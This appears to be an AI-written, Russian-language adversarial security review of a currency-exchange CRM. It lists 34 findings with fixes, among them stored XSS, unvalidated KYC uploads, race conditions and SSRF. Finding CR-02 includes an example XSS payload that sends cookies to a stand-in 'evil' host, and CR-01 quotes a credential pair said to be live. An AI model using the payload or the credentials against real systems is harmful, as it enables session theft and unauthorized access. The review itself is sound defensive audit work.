# CalcCRM — Adversarial Code Review

**Дата:** 2026-05-07
**Скоуп:** Backend (`app.py`, `calculator.py`, `broker_detailed.py`, `import_historical.py`), фронт (`static/`), тесты (`tests/`).
**Подход:** Adversarial — допущение, что код содержит дефекты, пока не доказано обратное.

> Сервис обрабатывает реальные деньги (RUB/THB/USDT), хранит KYC-документы, проксирует Doverka. Каждый из перечисленных дефектов — реальный риск, не stylistic.

---

## Сводка

| Severity | Кол-во |
|----------|-------:|
| 🔴 CRITICAL | 8 |
| 🟠 HIGH | 11 |
| 🟡 MEDIUM | 9 |
| ⚪ LOW | 6 |
| **Total** | **34** |

---

## 🔴 CRITICAL

### CR-01. Хардкод продакшн-кред в `import_historical.py` (закоммичен)
- **Файл:** `import_historical.py:77`
- **Что:** `s.post(..., json={"username": "admin", "password": "test1234"})`. Этот файл закоммичен в git и виден всем, у кого есть копия репозитория.
- **Почему проблема:** `admin/test1234` — реальные креды прод-CRM (подтверждено в `MEMORY.md`). Любой, кто склонировал репо, заходит в CRM и получает доступ к деньгам, KYC-фото, кошелькам, всем сделкам.
- **Fix:**
  ```python
  import os
  USERNAME = os.environ['CALCCRM_USERNAME']
  PASSWORD = os.environ['CALCCRM_PASSWORD']
  s.post(f"{BASE_URL}/api/auth/login", json={"username": USERNAME, "password": PASSWORD})
  ```
  + сменить пароль `admin` сразу после удаления из истории git (`git filter-repo` / новый репо), включить хотя бы 12-символьный пароль.

### CR-02. Stored XSS на публичной KYC-странице через `client_name`
- **Файл:** `static/kyc/index.html:773`
- **Что:** `document.querySelector('.intro-title').innerHTML = data.client_name + ', подтвердите личность<br>...'`. `client_name` приходит из `/api/kyc/status/<token>` без экранирования.
- **Почему проблема:** Менеджер CRM вводит `client_name` при генерации KYC-токена; страница `/kyc/?token=…` публичная (без auth). Менеджер (или кто угодно с CRM-доступом) может ввести `<img src=x onerror=fetch('//evil/?'+document.cookie)>`. Когда клиент открывает свою KYC-ссылку, скрипт исполняется в браузере **клиента** — атакующий читает токен, хайджачит сабмит KYC, перенаправляет на фишинг с теми же логотипами.
- **Fix:** заменить на `textContent`:
  ```js
  const titleEl = document.querySelector('.intro-title');
  titleEl.textContent = `${data.client_name}, подтвердите личность для безопасного обмена`;
  // Если нужен <br>, разнести на два узла.
  ```

### CR-03. Stored XSS на публичной странице реферера
- **Файл:** `static/referrer/index.html:226-373`
- **Что:** `document.getElementById('app').innerHTML = \`...${d.name}...${d.referral_link}...${d.bot_link}...${d.wa_link}...${d.client_masked}...${d.client_initials}...\``. Все поля приходят с сервера без экранирования. `name` редактируется любым CRM-пользователем (`/api/referrers PUT`), `client_masked`/`client_initials` производятся из имени клиента.
- **Почему проблема:** Любой компрометированный CRM-аккаунт прячет XSS в имя реферера/клиента → исполняется на публичной странице `/ref/<token>` каждого, кто откроет ссылку (это рекламируемая B2C-страница).
- **Fix:** перейти на DOM-API (`createElement`/`textContent`), либо проксируйте через простой helper `escapeHtml()` и применяйте ко всем динамическим вставкам. Шаблонные литералы с `innerHTML` + сторонними строками — фундаментально небезопасны.

### CR-04. KYC-загрузка без валидации типа файла, без аутентификации, без rate-limit
- **Файл:** `app.py:3318-3378`, `PUBLIC_PATHS` на строке 42
- **Что:** Эндпоинт `/api/kyc/submit` публичный, принимает `multipart/form-data` от любого, кто угадал/получил `token`. Нет проверок: MIME-типа, magic bytes, расширения, размера на файл. `secure_filename` нормализует имя, но не содержимое.
- **Почему проблема:**
  1. Атакующий заливает `.svg` с `<script>` → `kyc_photo` выдаёт его с `Content-Type: image/svg+xml` → исполняется JS в контексте `proud-renewal-production-…/api/kyc/photo/...` → крадёт сессию админа, который смотрит KYC.
  2. Заливает 10 файлов по ~10MB через `liveness[]` (общий лимит 10MB request — но multipart позволяет несколько в одном). Нет квоты на токен → DoS диска (`kyc_uploads/` без квоты, Railway = маленький диск).
  3. Без rate-limit — массовый спам ботом запросами `liveness_0..N.jpg` забивает диск.
  4. Перезаливка после reject (`status = PENDING` сбрасывается) — нет ограничения по количеству перезаливок.
- **Fix:**
  ```python
  ALLOWED_MIME = {'image/jpeg', 'image/png', 'image/webp'}
  MAX_FILE_BYTES = 5 * 1024 * 1024

  def _validate_image(file_storage):
      if file_storage.mimetype not in ALLOWED_MIME:
          abort(400, 'unsupported_type')
      head = file_storage.stream.read(12)
      file_storage.stream.seek(0)
      # JPEG: FFD8FF, PNG: 89504E47, WEBP: RIFF....WEBP
      if not (head.startswith(b'\xff\xd8\xff') or head.startswith(b'\x89PNG') or (head[:4]==b'RIFF' and head[8:12]==b'WEBP')):
          abort(400, 'invalid_image')
      # размер
      file_storage.stream.seek(0, 2)
      size = file_storage.stream.tell()
      file_storage.stream.seek(0)
      if size > MAX_FILE_BYTES:
          abort(413, 'too_large')
  ```
  + `@limiter.limit("10/hour")` на `/api/kyc/submit`, + проверка max ~5 liveness-кадров, + перенумеровывать файлы (`liveness_0.jpg`, не оригинальное имя).

### CR-05. Race condition при списании cash_batch / card / wallet (двойная трата)
- **Файлы:**
  - `app.py:2640-2694` (`topup_card`) — read-modify-write `batch.remaining_thb` без блокировки.
  - `app.py:2921-3001` (`create_reimbursement`) — массовое обновление `payout_amount_usdt` без блокировки сделок.
  - `app.py:1561-1572`, `1641-1664` (`create_deal` / `update_deal`) — добавляет `WalletOperation` для Binance-кошелька; параллельный запрос может создать две операции (race в `query → not existing → add`).
- **Что:** Нет `SELECT … FOR UPDATE`, нет `serializable` транзакций, два одновременных запроса проходят проверку `batch.remaining_thb >= amount` и оба декрементируют — итог может уйти в минус, либо `WalletOperation` дублируется → удвоенное списание баланса.
- **Почему проблема:** На SQLite проблема замаскирована глобальной блокировкой, но на проде PostgreSQL (Railway) между чтением и записью реально пройдут параллельные запросы. На реальных деньгах — реальная потеря.
- **Fix:**
  ```python
  batch = session.query(CashBatch).filter(CashBatch.id == batch_id) \
                  .with_for_update().first()
  if batch.remaining_thb < amount_thb:
      return jsonify({'success': False, 'error': 'insufficient'}), 400
  batch.remaining_thb -= amount_thb
  ```
  Аналогично для `WalletOperation`-апсерта — использовать UNIQUE constraint `(deal_id, type)` + `INSERT … ON CONFLICT DO UPDATE`.

### CR-06. `webhook_url` записывается в глобальную переменную (race + persist + SSRF)
- **Файл:** `app.py:3063-3068` (`set_webhook_config`), `app.py:984-1002` (`send_webhook_async`)
- **Что:**
  ```python
  global WEBHOOK_URL
  WEBHOOK_URL = data.get('webhook_url', '').strip()
  ```
  Любой авторизованный пользователь может подменить URL → все будущие выплаты сделок (`/api/deals` POST/PUT с completed) уйдут вместе с client_name, telegram, суммами на сторонний URL.
- **Почему проблема:**
  1. **SSRF/exfiltration:** компрометированный CRM-аккаунт превращает прод в exfil-канал (внутренние сети Railway, метаданные облака, и т.д.).
  2. **Отсутствие валидации URL:** нет схемы (`http`/`https`-only), нет блокировки приватных IP / `localhost` / `169.254.169.254`.
  3. **Persist:** глобальная переменная не персистится в БД, но переживает между запросами в gunicorn-воркере; разные воркеры будут иметь разные значения → недетерминированное поведение.
  4. **Никакого rate-limit, никакого audit log** — изменение проходит молча.
- **Fix:** хранить в БД (`SystemSettings`-таблица), валидировать `urllib.parse` (только `https://`, не resolve в `127.0.0.0/8`/`10.0.0.0/8`/`169.254.0.0/16`), писать audit-record `who+when+oldurl+newurl`, требовать роль admin (когда RBAC появится).

### CR-07. `/api/proxy/create-payment` проксирует произвольный JSON в Doverka API
- **Файл:** `app.py:3107-3177`
- **Что:** Берёт `request.get_json()`, удаляет `provider`, остальное **как есть** отправляет в `https://api.doverkapay.com/v1/payments` с серверным API-ключом (`DOVERKA_API_KEY`).
- **Почему проблема:** Любой авторизованный пользователь (включая компрометированного менеджера) может вызывать любые поля Doverka API через серверный ключ — повышение привилегий внутри Doverka, ручное создание платежей с произвольным `order_transaction_id`, привязка чужих идентификаторов к нашему аккаунту, потенциальное изменение `callback_url` если Doverka это поддерживает. Ровно ту же претензию подтверждает прошлый аудит (RECURRING H3).
- **Fix:** whitelist полей:
  ```python
  ALLOWED = {'amount', 'description', 'order_id', 'currency_id'}
  doverka_payload = {
      'currency_id': proxy_create_payment._currency_id,
      'amount_rub': float(data.get('amount', 0)),
      'order_transaction_id': str(data.get('order_id', f'GR-{int(time.time()*1000)}'))[:64],
      'order_title': str(data.get('description', 'Grusha Exchange'))[:128],
  }
  ```
  + явная типизация и обрезка длин.

### CR-08. `auth_setup` гонка по проверке "первого админа"
- **Файл:** `app.py:1067-1104`
- **Что:** Эндпоинт публичный (только `SETUP_ENABLED=true` env-флаг + 3/min лимит). Проверка `existing = db.query(AdminUser).first()` и последующее `db.add(admin); db.commit()` — без транзакционной изоляции/UNIQUE-защиты на «не более одного admin». Два параллельных запроса в окне < 100мс создадут двух админов; первый-же из них перепишет сессию.
- **Почему проблема:** Если когда-нибудь `SETUP_ENABLED` снова откроют (часто остаётся `true` после первого раза, потому что забывают переключить), атакующий с двумя одновременными запросами успеет подсунуть своего админа. Дополнительно `auth_setup` сразу логинит созданного админа — фактически в обход существующего `admin`.
- **Fix:**
  - `UNIQUE` на роль `admin` в БД либо `count() == 0` внутри транзакции с `serializable` уровнем.
  - Полностью убрать публичный эндпоинт; завести админа через одноразовый CLI-скрипт `python -m scripts.create_admin`.
  - Установить `app.config['SESSION_COOKIE_SECURE'] = True` (уже OK), но **проверить, что `SETUP_ENABLED` сейчас выключен на проде** (если включено — это CRITICAL прямо сейчас).

---

## 🟠 HIGH

### HI-01. Сессионные cookies живут 30 дней (регрессия после прошлого аудита)
- **Файл:** `app.py:29` — `app.permanent_session_lifetime = timedelta(days=30)`
- **Почему проблема:** Прошлый аудит (`security/260323-1200-…/findings.md`) явно отмечал это как M2 «✅ Fixed → 7 дней». Регрессия. На YMYL-сервисе с реальными деньгами 30-дневная сессия + украденный ноутбук = месяц бесконтрольного доступа.
- **Fix:** вернуть `timedelta(days=7)` и обновить `test_security.py:152` (там стоит ≤90, что не ловит регрессию).

### HI-02. Уязвимость к XSS в CRM-интерфейсе (массовые `innerHTML` со строками из БД)
- **Файл:** `static/crm/crm.html` — 85 вхождений `innerHTML` (строки 2542-2563, 2647+, 2878, 4142, 4175, 4320, 4427, 4500, 4631, 4880-5000, и др.)
- **Что:** `client_name`, `manager_name`, `notes`, `referrer_name`, `address` (свободный ввод!), `holder_name`, `bank_name`, `card_name`, `payin_partner_name`, `custom_payin_currency`, `payin_tx_hash` — всё подставляется прямо в шаблонные литералы и присваивается через `.innerHTML`.
- **Почему проблема:** Хотя CRM защищён auth, инсайдер или компрометированный аккаунт легко вешает `<img src=x onerror=...>` в поле «notes» и крадёт сессии других менеджеров (включая владельца, у которого видны все сделки и кошельки). Self-XSS становится stored XSS, поскольку `notes` сохраняется и рендерится у всех в `recentDealsTable`/`dealModalContent`.
- **Fix:** глобальный helper `function esc(s){ return String(s ?? '').replace(/[&<>"'/]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','/':'&#x2F;'}[c])); }` и обернуть **все** интерполированные пользовательские поля. Альтернатива — построение DOM через `createElement`/`textContent` (предпочтительно для долгосрочного кода).

### HI-03. Hash паролей: SHA-256 фоллбэк солит общим литералом, не per-user
- **Файл:** `app.py:124-127`
  ```python
  salt = 'grusha-salt-2026'
  return hashlib.sha256(f'{salt}{password}'.encode()).hexdigest()
  ```
- **Почему проблема:** Хотя есть автомиграция в bcrypt при следующем логине, любой пользователь, не входивший с фикса, до сих пор хранит SHA-256 без per-user соли — radusgo через rainbow-таблицу при утечке БД. И сам литерал «grusha-salt-2026» тривиально находится в публичных источниках.
- **Fix:** одноразовый миграционный скрипт, который форсирует `password_reset` для всех `password_hash NOT LIKE '$2b$%'` (выслать ссылки на reset). Удалить `_legacy_hash` и проверку на него.

### HI-04. Public `/api/calculate`, `/api/rates`, `/api/rates/precise` без rate-limit
- **Файл:** `app.py:39-47` (`PUBLIC_PATHS`), `app.py:1146-1396`
- **Что:** Любой запрос `/api/rates/precise` запускает Playwright (~8с CPU + Chromium-память). Очередь хорошо ставит их последовательно, но снаружи никто не мешает заслать 10000 RPS — сервер постоянно занят, легитимные клиенты получают `queue_timeout`. То же для `/api/calculate` (синхронно вызывает `asyncio.run(get_all_rates)` → внешний HTTP к Binance/Doverka на каждый запрос).
- **Fix:**
  ```python
  @app.route('/api/rates/precise', methods=['POST'])
  @limiter.limit("10/minute")
  ```
  Применить `@limiter.limit("60/minute")` к `/api/rates`, `/api/calculate`, `/api/partner/<token>/precise`, `/api/partner/<token>/calculate`, `/api/ref/<token>/stats`, `/api/kyc/status/<token>`, `/api/kyc/submit`. Привязать к `partner.token`/`ref.token` для гранулярности.

### HI-05. `_legacy_hash` миграция не сохраняется при ошибке login
- **Файл:** `app.py:1018-1043`
- **Что:** При SHA-256-логине `check_password` присваивает `self.password_hash = bcrypt(...)`, потом `db.commit()` в `auth_login`. Но это происходит после возврата `True`, что нормально. Проблема: если `db.commit()` падает (race с другим логином, разрыв соединения), миграция теряется → следующий логин повторит ту же миграцию. **Лишний риск:** если логин сейчас вернёт ошибку до commit (например, exception в `flask_session`), bcrypt-хеш в памяти, но в БД остался SHA-256 → пользователь всё ещё уязвим. На уровне SQLAlchemy объект `user` помечен как dirty в session, но если scoped_session-rollback не сработал — состояние БД и hash рассинхронизированы.
- **Fix:** делать миграцию в отдельной транзакции в начале handler, до проверки success, и логировать неуспех:
  ```python
  if user and user.check_password(password):
      try: db.commit()
      except Exception: db.rollback(); app.logger.warning(...)
  ```

### HI-06. SECRET_KEY чтение через `os.environ['SECRET_KEY']` падает, если переменной нет — но воркер просто крашится молча
- **Файл:** `app.py:25`
- **Что:** Падает с `KeyError` при импорте, gunicorn перезапускает воркера до бесконечности; никаких health-чеков нет, чтобы это поймать. Ещё критичнее: если разработчик локально забыл `.env`, `local.db` создаётся со случайным state (миграция уже могла начаться).
- **Fix:**
  ```python
  SECRET_KEY = os.environ.get('SECRET_KEY')
  if not SECRET_KEY:
      raise RuntimeError("SECRET_KEY env required; set via Railway/.env")
  app.secret_key = SECRET_KEY
  ```
  + явное логирование при старте.

### HI-07. KYC-файлы остаются на диске после `kyc_cancel` если упало в БД
- **Файл:** `app.py:3490-3511`
- **Что:** `_delete_kyc_files(token)` вызывается до `session.delete(kyc); session.commit()`. Если commit упадёт, в БД запись осталась, файлов нет → `kyc_review` показывает пустой, фронт ломается. Обратное тоже опасно: если поменять порядок и БД-удаление пройдёт, а `shutil.rmtree` упадёт — файлы остаются «забытыми» без БД-записи (утечка PII бессрочно).
- **Fix:** удалять файлы после успешного commit, а если `rmtree` упал — поставить в очередь GC (cron-задача чистит `kyc_uploads/<token>/` без записи в БД).

### HI-08. `delete_card_topup` не возвращает баланс карте
- **Файл:** `app.py:2736-2765`
- **Что:** При удалении topup откатывается `batch.remaining_thb` (если был cash_batch), но не уменьшается `card.balance_thb`. Сделок-аллокаций по карте может уже не быть, но баланс остаётся завышенным.
- **Fix:**
  ```python
  if card:
      card.balance_thb = max(0, card.balance_thb - topup.amount_thb)
  session.delete(topup)
  ```

### HI-09. `client_name` синхронизируется во **всех** сделках клиента при PUT
- **Файл:** `app.py:1668-1675`
- **Что:** При обновлении одной сделки `synchronize_session=False` apдейтит `client_name` во всех сделках клиента — включая исторические, которые могли быть оформлены на старое имя/прозвище. Это переписывает аудит-логику и ломает GSheet-поиск (`find_deal_row_in_gsheet` ищет по `client_name + дата`, и старые строки в шите больше не найдутся → дубликаты при синке).
- **Fix:** обновлять `Client.name`, но не трогать денормализованный `client_name` в исторических `Deal`-строках (пусть остаётся снапшотом на момент сделки).

### HI-10. `find_deal_row_in_gsheet` — потенциальные коллизии и удаление чужой строки
- **Файл:** `app.py:836-847`, использование в `delete_deal_from_gsheet`, `update_deal_in_gsheet`
- **Что:** Поиск по `client_name + дата (DD.MM.YYYY)`. Если в один день у клиента несколько сделок (типичный кейс), вернётся первая совпадающая, и `delete_rows`/`update` ударит **не туда**. Тихая порча отчётности.
- **Fix:** добавить отдельный servive-столбец в GSheet с `deal.id` и искать по нему. Текущий подход не выживет даже двух сделок одного клиента в один день.

### HI-11. SQLAlchemy `scoped_session` не очищается между запросами
- **Файл:** `app.py:87-90`
- **Что:** `Session = scoped_session(SessionLocal)`, но нет `Session.remove()` / `app.teardown_appcontext` callback. Каждый воркер копит сессии по числу тредов; в долгосрочной перспективе это connection leak (особенно на gunicorn с несколькими workers). + `expire_on_commit=False` означает, что объекты после commit видны через старый snapshot — потенциальный stale-read.
- **Fix:**
  ```python
  @app.teardown_appcontext
  def remove_session(exc=None):
      Session.remove()
  ```

---

## 🟡 MEDIUM

### MD-01. `TRONSCAN_CACHE` — глобальный dict без блокировки
- **Файл:** `app.py:93-98`, `app.py:1937, 2217-2218, 2386-2387`
- **Что:** Несколько потоков пишут/читают `TRONSCAN_CACHE['incoming']['data']` одновременно без `threading.Lock()`. Результат — частичный read во время write (например, между `data = ...` и `timestamp = ...` другой поток увидит свежий `data` и старый `timestamp`).
- **Fix:** обернуть `threading.RLock()` или мигрировать на `redis`/`cachelib`.

### MD-02. `find_deal_row_in_gsheet` падает на пустых строках
- **Файл:** `app.py:841` — `if len(row) >= 4: row[1], row[3]`. Но строка может быть `[]`. Проверка спасает, но не от `IndexError` если row=`['', '', '']` — `len = 3` < 4, OK. На самом деле OK; флаг как defensive.

### MD-03. `auth_setup` создаёт админа при `setup_enabled=true` даже если уже есть пользователи
- **Файл:** `app.py:1067-1104`
- **Что:** Логика `existing = db.query(AdminUser).first(); if existing: return 403`. Корректно блокирует, но эндпоинт остаётся публичным до выключения env-флага. Если по ошибке прод поднят с `SETUP_ENABLED=true` и базой пустой (новый instance) — атакующий первым создаёт админа.
- **Fix:** удалить эндпоинт целиком; миграция через CLI.

### MD-04. `kyc_photo` — нет проверки авторизации в `before_request` (`/api/kyc/` начинается с публичного префикса!)
- **Файл:** `app.py:42` (`/api/kyc/status/`, `/api/kyc/submit`), `app.py:3406-3435`
- **Что:** В `PUBLIC_PATHS` сейчас `/api/kyc/status/` и `/api/kyc/submit` — это OK. `/api/kyc/photo/<token>/...` НЕ начинается с `/api/kyc/status/` или `/api/kyc/submit`, значит требует auth (✅). Сам handler ещё раз проверяет `flask_session.get('user_id')` — defensive, OK. **НО:** Если кто-то добавит `/api/kyc/` целиком в PUBLIC_PATHS (грубая правка по аналогии), фото станут публичными. Сделать защиту явнее:
- **Fix:** заменить общую префикс-проверку на белый список конкретных путей: `('/api/kyc/status/', '/api/kyc/submit',)`. Сейчас это уже так, но `path.startswith('/api/kyc/status/')` срабатывает для `/api/kyc/status/<token>` — корректно. Закомментировать предупреждение, чтобы будущие правки знали.

### MD-05. `verify_transaction_post` принимает любой `tx_hash` без формата
- **Файл:** `app.py:2401-2437`
- **Что:** Нет проверки, что `tx_hash` похож на TRON-хеш (64 hex). Любой вход проксируется в TronScan — DoS вектор на сторонний API + наш квота-лимит.
- **Fix:** `if not re.fullmatch(r'[0-9a-f]{64}', tx_hash, re.I): return 400`.

### MD-06. `wallet.address` не валидируется при создании
- **Файл:** `app.py:1970-1996`
- **Что:** `address` принимается как есть. Невалидный TRON-адрес ляжет в БД, навсегда сломает баланс-обход (TronScan вернёт пусто, кошелёк будет показывать $0). Также XSS-вектор в crm.html (адрес рендерится через innerHTML).
- **Fix:** `if not re.fullmatch(r'T[1-9A-HJ-NP-Za-km-z]{33}', address): abort(400)`.

### MD-07. `payout_amount_usdt` пропорциональное распределение в `create_reimbursement` — потенциальная потеря/округление
- **Файл:** `app.py:2956`
- **Что:** `deal.payout_amount_usdt = amount_usdt * (deal_payout / total_payout)`. На float это даёт хвосты типа 12.345678901; сумма `payout_amount_usdt` по сделкам не равна `amount_usdt` (потери на округлении). При повторных синках в GSheet расхождение копится.
- **Fix:** использовать `Decimal`, последнюю сделку считать как `total_amount - sum(predшествующих)`, чтобы сумма не разъехалась.

### MD-08. Голые `except: pass` в миграции БД и в TronScan-блоках
- **Файл:** `app.py:613-619`, `1961`, `2017`, `2090`, `2096`
- **Что:** `except: pass` ловит даже `KeyboardInterrupt`/`SystemExit`. Маскирует баги.
- **Fix:** `except Exception as e: app.logger.warning('migration step failed: %s', e)`.

### MD-09. `app.logger.error('Webhook error: ...')` в неподходящих местах
- **Файл:** `app.py:1398, 3204` — ошибка в `/api/calculate` логируется как «Webhook error», в `/api/webhook/doverka` тоже «Webhook error» (правильно). В `/api/calculate` это копипаста, путает диагностику.
- **Fix:** уникальные сообщения в каждом handler-е.

---

## ⚪ LOW

### LO-01. `auth_login` возвращает разные сообщения для несуществующего пользователя и неверного пароля?
- **Факт:** Нет — оба возвращают «Неверный логин или пароль» (`app.py:1031`). ✅ OK. Оставлено как контрольная точка ревью.

### LO-02. Хардкод USDT-контракта `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` дублируется по коду
- **Файлы:** `app.py:1932, 1949, 2014, 2133, 2290`
- **Fix:** константа `USDT_TRC20_CONTRACT` сверху файла.

### LO-03. `print(...)`-debug на проде вместо logger
- **Файл:** Сотни вхождений `print(..., flush=True)` в `app.py` и `calculator.py`.
- **Fix:** перейти на `app.logger.info/debug`. Конфигурируемо.

### LO-04. Закомментированный мёртвый код / устаревшие комментарии
- **Файл:** `app.py:1338` («Удалён старый код THB → RUB...»). Чистить.

### LO-05. `runtime.txt` (14 байт) пинит версию Python — не указано, какая
- **Файл:** `runtime.txt`
- **Fix:** проверить, что версия согласована с Dockerfile, иначе Railway соберёт не на той версии.

### LO-06. `tests/test_security.py:152-153` слишком слабая проверка lifetime (≤90 дней)
- **Что:** Не ловит регрессию с 7 → 30 дней. См. HI-01.
- **Fix:** `assert lifetime.days <= 14`.

---

## Тесты — оценка покрытия

**Хорошо:**
- `test_calculator.py`, `test_broker.py` — детальные unit-тесты на формулы, тиры, граничные значения. Покрытие RUB→THB / THB→USDT / USDT→THB / RUB→USDT для обоих направлений (`amount`/`target`).
- `test_security.py` — параметризованные тесты на auth-блокировку API и страниц, что критично — это контракт между `PUBLIC_PATHS` и реальностью.

**Плохо/критичные пробелы:**
- ❌ **Нет тестов на `create_reimbursement`** — самая денежная функция, пропорциональное распределение USDT, race conditions, recompute профита.
- ❌ **Нет тестов на `topup_card`** (списание из batch + увеличение баланса карты).
- ❌ **Нет тестов на `delete_deal`** (что delete отсоединяет ops, удаляет пустой reimbursement, удаляет из GSheet).
- ❌ **Нет тестов на edge-cases калькулятора:** `amount=0`, `amount<0`, `rub_usdt=None`, очень большие суммы (overflow `int(payout_thb)`).
- ❌ **Нет тестов на KYC-flow** (генерация → submit → approve → файл удалён).
- ❌ **Нет тестов на `find_deal_row_in_gsheet`** (collision при двух сделках одного клиента в один день).
- ❌ **Нет интеграционных тестов на race conditions** (важно при переходе на PostgreSQL).
- ❌ **`test_security.py` не проверяет CSRF-защиту** (Flask-Limiter ≠ CSRF-токены; SameSite=Lax — defense, но недостаточно для state-changing GET'ов, которых тут нет).

---

## Топ-5 находок по бизнес-импакту (порядок фикса)

| # | ID | Что фиксим первым | Бизнес-импакт |
|---|----|-------------------|---------------|
| 1 | **CR-01** | Удалить хардкод `admin/test1234` из `import_historical.py`, сменить пароль admin, очистить git-историю | **Прямая компрометация всего CRM**. Любой, кто увидит репозиторий (включая утечки из бэкапов / контракторов / случайный публичный push), получает деньги, KYC, кошельки. |
| 2 | **CR-04** | Добавить валидацию MIME/magic-bytes/размера + rate-limit на `/api/kyc/submit`; защитить отдачу SVG (force `image/png` или конвертация) | **Атака на менеджеров через KYC-фото:** SVG-XSS крадёт сессии админов; диск Railway забивается за минуты. KYC = личные паспорта клиентов → утечка = регуляторный риск + репутация. |
| 3 | **CR-05** | `SELECT … FOR UPDATE` на cash_batch, card.balance, wallet ops + UNIQUE(deal_id, type) на WalletOperation | **Двойная трата:** На реальной нагрузке (несколько менеджеров одновременно) баланс уйдёт в минус, или одна и та же выплата спишется дважды. Деньги напрямую. |
| 4 | **CR-02 + CR-03 + HI-02** | Глобальный `escapeHtml()`, заменить все user-controlled `innerHTML` на `textContent`/createElement в KYC, referrer, CRM | **Stored XSS в трёх местах**, два публичных. Угоняет сессии менеджеров и клиентов. Цепочка: компрометированный реферер-код → XSS на `/ref/<token>` → крадёт админ-сессии → доступ к деньгам. |
| 5 | **CR-07 + CR-06** | Whitelist полей в proxy/create-payment; перевести WEBHOOK_URL в БД + валидация URL (https-only, не приватные IP) | **Эскалация привилегий через Doverka API** + **превращение CRM в SSRF/exfil-канал**. Один компрометированный аккаунт уносит всю историю сделок и творит с Doverka API что хочет (с нашим серверным ключом). |

---

_Reviewer: Claude Opus 4.7_
_Stance: adversarial (forced)_
_Файлы прочитаны: app.py (4150 строк), calculator.py (866), broker_detailed.py (415), import_historical.py (92), tests/* (1178), static/* (выборочно critical-paths)_
